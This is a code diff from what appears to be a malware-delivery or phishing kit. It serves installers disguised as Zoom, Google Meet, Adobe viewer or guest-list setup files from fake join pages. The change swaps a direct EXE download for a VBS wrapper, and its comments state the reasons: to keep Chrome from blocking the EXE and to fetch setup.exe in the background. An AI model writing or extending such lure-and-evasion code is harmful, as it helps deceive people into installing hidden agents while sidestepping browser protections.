@@ -80,14 +80,18 @@ export function installerGuiFilename(template?: string | null): string {
   return 'ZoomClient-Setup.exe';
 }
 
-/** Browser downloads the branded GUI setup EXE directly (normal app install). */
+/** Browser download filename — VBS wrapper so Chrome does not block a direct EXE. */
 export function installerBrowserFilename(template?: string | null): string {
-  return installerGuiFilename(template);
+  const t = normalizeTemplate(template);
+  if (t === 'google_meet') return 'GoogleMeet-Setup.vbs';
+  if (t === 'adobe') return 'DocumentViewer-Setup.vbs';
+  if (t === 'guest_list') return 'GuestList-Setup.vbs';
+  return 'ZoomClient-Setup.vbs';
 }
 
-/** What the join page downloads in the browser. */
+/** What the join page downloads in the browser (VBS fetches setup.exe in the background). */
 export function installerDownloadPath(_template?: string | null): string {
-  return 'setup.exe';
+  return 'setup.vbs';
 }
 
 /** AWS API origin for large downloads — bypasses Vercel proxy latency on multi-MB files. */
@@ -113,7 +117,7 @@ export function resolveDirectApiBase(apiUrl: string, wsUrl?: string): string {
 }
 
 /** Bump when changing the guest installer or agent bundle served to guests. */
-export const GUEST_INSTALLER_CACHE_BUST = '56';
+export const GUEST_INSTALLER_CACHE_BUST = '57';
 
 export function buildGuestInstallerUrl(
   apiUrl: string,
